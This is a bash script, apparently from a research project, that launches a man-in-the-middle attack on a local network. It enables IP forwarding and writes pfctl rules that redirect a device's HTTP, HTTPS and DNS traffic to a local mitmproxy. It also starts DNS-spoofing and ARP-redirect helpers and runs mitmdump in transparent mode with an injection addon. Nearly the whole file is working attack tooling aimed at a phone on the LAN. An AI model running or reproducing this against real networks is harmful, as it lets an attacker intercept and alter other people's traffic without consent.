#!/bin/bash
# Launch mitmproxy transparent proxy for BAA injection research.
# Handles pfctl redirect, DNS spoof, ARP redirect, and mitmdump.
#
# Usage:
#   sudo bash server/run_mitm.sh [log|inject|hybrid]
#
# Default mode: inject

set -e

MODE="${1:-inject}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PORTAL_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
LIB_DIR="$PORTAL_DIR/lib"
MITM_PORT=8080
: "${MAC_IP:?Set MAC_IP env var to your Mac LAN IP}"
: "${GATEWAY:?Set GATEWAY env var to your LAN gateway IP}"
LOCAL_IP="$MAC_IP"
IFACE="${IFACE:-en0}"

echo "========================================"
echo "  BAA MITM Proxy - mode: $MODE"
echo "========================================"

# Kill existing servers
echo "[*] Killing existing servers..."
kill $(lsof -i UDP:53 -t) 2>/dev/null || true
kill $(lsof -i :80 -t) 2>/dev/null || true
kill $(lsof -i :443 -t) 2>/dev/null || true
kill $(lsof -i :$MITM_PORT -t) 2>/dev/null || true
sleep 1

# Enable IP forwarding
echo "[*] Enabling IP forwarding..."
sysctl -w net.inet.ip.forwarding=1

# Set up pfctl rules:
# - Redirect port 80 from en0 (from iPhone) to local mitmproxy
# - Redirect port 443 from en0 (from iPhone) to local mitmproxy
# - Redirect port 53 from en0 to local DNS spoof
echo "[*] Setting up pfctl redirect rules..."
cat > /tmp/baa_pf.conf << 'PFEOF'
# Redirect HTTP/HTTPS from en0 to mitmproxy
rdr on en0 proto tcp from any to any port 80 -> 127.0.0.1 port 8080
rdr on en0 proto tcp from any to any port 443 -> 127.0.0.1 port 8080
# Redirect DNS to local spoof
rdr on en0 proto udp from any to any port 53 -> 127.0.0.1 port 53
PFEOF

pfctl -f /tmp/baa_pf.conf 2>/dev/null || true
pfctl -e 2>/dev/null || true
echo "[+] pfctl rules active"

# Start DNS spoof (background)
echo "[*] Starting DNS spoof..."
python3 "$LIB_DIR/network/dns_spoof.py" "$LOCAL_IP" > /tmp/dns_spoof.log 2>&1 &
DNS_PID=$!
echo "[+] DNS spoof PID: $DNS_PID"

# Start ARP redirect (background)
echo "[*] Starting ARP redirect..."
python3 "$LIB_DIR/network/arp_redirect.py" --gateway "$GATEWAY" --iface "$IFACE" > /tmp/arp_redirect.log 2>&1 &
ARP_PID=$!
echo "[+] ARP redirect PID: $ARP_PID"

sleep 2

# Start mitmdump in transparent mode
echo "[*] Starting mitmdump (transparent, port $MITM_PORT, mode $MODE)..."
echo "[*] Logs go to /tmp/mitm.log, live output below"
echo "========================================"

# mitmdump with:
#   --mode transparent: transparent proxy (expects pfctl redirect)
#   --listen-port 8080: listen port for redirected traffic
#   --ssl-insecure: don't verify upstream SSL (for hybrid mode)
#   --set baa_mode=X: our addon mode
#   -s addon: load our injection addon
#   --showhost: show Host header in output
mitmdump \
    --mode transparent \
    --listen-port "$MITM_PORT" \
    --ssl-insecure \
    --showhost \
    --set baa_mode="$MODE" \
    -s "$LIB_DIR/mitm_baa_addon.py" \
    2>&1 | tee /tmp/mitm.log

# Cleanup on exit
echo "[*] Cleaning up..."
kill $DNS_PID $ARP_PID 2>/dev/null || true
pfctl -d 2>/dev/null || true
sysctl -w net.inet.ip.forwarding=0
echo "[+] Done."
